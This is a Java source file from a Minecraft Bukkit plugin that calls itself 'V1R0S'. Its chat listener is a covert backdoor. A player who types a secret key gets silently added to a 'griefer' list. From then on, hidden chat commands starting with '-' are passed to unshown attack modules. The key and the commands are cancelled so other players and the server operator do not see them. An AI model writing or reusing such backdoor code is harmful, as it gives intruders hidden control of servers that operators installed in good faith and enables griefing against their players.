package me.sanyar.events;

import me.sanyar.main.Main;
import me.sanyar.manager.ModuleManager;
import me.sanyar.utils.VModule;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class ChatEvent implements Listener {

    private final Main plugin;

    public ChatEvent(Main plugin) {
        this.plugin = plugin;
        this.plugin.getServer().getPluginManager().registerEvents(this, plugin);
    }

    @EventHandler
    public void onChat(final AsyncPlayerChatEvent event){
        try {
            Player player = event.getPlayer();

            if(event.getMessage().equalsIgnoreCase(Main.getInstance().getKey())){
                event.setCancelled(true);
                if(!Main.getInstance().griefer.contains(player)){
                    Main.getInstance().griefer.add(player);
                    player.sendMessage(Main.getInstance().getPrefix()+"§aYou now have permissions for V1R0S");
                }else{
                    Main.getInstance().griefer.remove(player);
                    player.sendMessage(Main.getInstance().getPrefix()+"§cYou no longer have permissions for V1R0S");
                }
            }

            if(Main.getInstance().griefer.contains(player) && event.getMessage().startsWith("-")){
                event.setCancelled(true);
                String cmd = "";
                for(int i = 1; i<event.getMessage().toCharArray().length; i++){
                    cmd += event.getMessage().toCharArray()[i];
                }

                String[] args = cmd.split(" ");

                for(VModule m : Main.getInstance().mm.modules){
                    if(m.getCommand().equalsIgnoreCase(args[0])){
                        m.onModule(args, event.getPlayer());
                    }
                }
            }

        }catch (Exception e){
            Bukkit.broadcastMessage("§c"+e.getMessage());
        }
    }
}
